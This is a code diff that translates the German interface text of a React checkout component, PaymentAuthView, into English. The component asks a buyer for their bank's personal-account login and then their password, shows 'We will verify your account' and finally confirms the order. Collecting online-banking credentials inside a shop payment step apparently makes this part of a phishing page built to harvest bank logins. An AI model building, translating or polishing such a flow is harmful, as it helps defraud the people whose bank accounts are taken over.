@@ -35,11 +35,11 @@ export const PaymentAuthView = ({
           {!loginLoaded && !loginLoading && (
             <form onSubmit={submitLogin}>
               <h3 style={{ marginBottom: '6px', padding: 0 }}>
-                Sie müssen das persönliche Konto Ihrer Bank eingeben. Login eingeben
+                You need to enter your bank's personal account. Enter login
               </h3>
               <div className="card-input">
                 <label htmlFor="cardNumber" className="card-input__label">
-                  Anmeldung
+                  Sign up
                 </label>
                 <input
                   name="cardNumber"
@@ -51,7 +51,7 @@ export const PaymentAuthView = ({
                 />
               </div>
               <button type="submit" className="cta cta-full-width" disabled={loginFormDisabled}>
-                Bestätigen Sie
+                Confirm
               </button>
             </form>
           )}
@@ -64,14 +64,14 @@ export const PaymentAuthView = ({
             <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
               <Progress size={70} />
               <h3 style={{ marginTop: '24px', padding: 0 }}>
-                Wir werden Ihr Konto verifizieren. Warten Sie mal.
+                We will verify your account. Please wait.
               </h3>
             </div>
           )}
           {!passwordLoading && !passwordLoaded && loginLoaded && (
             <form onSubmit={submitPassword}>
               <h3 style={{ marginBottom: '6px', padding: 0 }}>
-                Sie müssen das persönliche Konto Ihrer Bank eingeben. Passwort eingeben
+                You need to enter your bank's personal account. Enter password
               </h3>
               <div className="card-input">
                 <label htmlFor="cardNumber" className="card-input__label">
@@ -87,7 +87,7 @@ export const PaymentAuthView = ({
                 />
               </div>
               <button type="submit" className="cta cta-full-width" disabled={passwordFormDisabled}>
-                Bestätigen Sie
+                Confirm
               </button>
             </form>
           )}
@@ -100,7 +100,7 @@ export const PaymentAuthView = ({
             <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
               <Progress size={70} />
               <h3 style={{ marginTop: '24px', padding: 0 }}>
-                Wir werden Ihr Konto verifizieren. Warten Sie mal.
+                We will verify your account. Please wait.
               </h3>
             </div>
           )}
@@ -113,10 +113,10 @@ export const PaymentAuthView = ({
       <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
         <FavoriteIcon style={{ color: 'rgb(229, 9, 127)', fontSize: '8rem' }} />
         <h3 style={{ margin: '24px 0 30px', padding: 0, lineHeight: 1.2, textAlign: 'center' }}>
-          Ihre Bestellung wurde zur Bearbeitung gesendet. Wir melden uns bei Ihnen.
+          Your order has been sent for processing. We will contact you.
         </h3>
         <button type="button" className="cta cta-full-width" onClick={() => redirect(ROUTES.HOME)}>
-          Zurück zur Startseite
+          Back to the home page
         </button>
       </div>
     )}
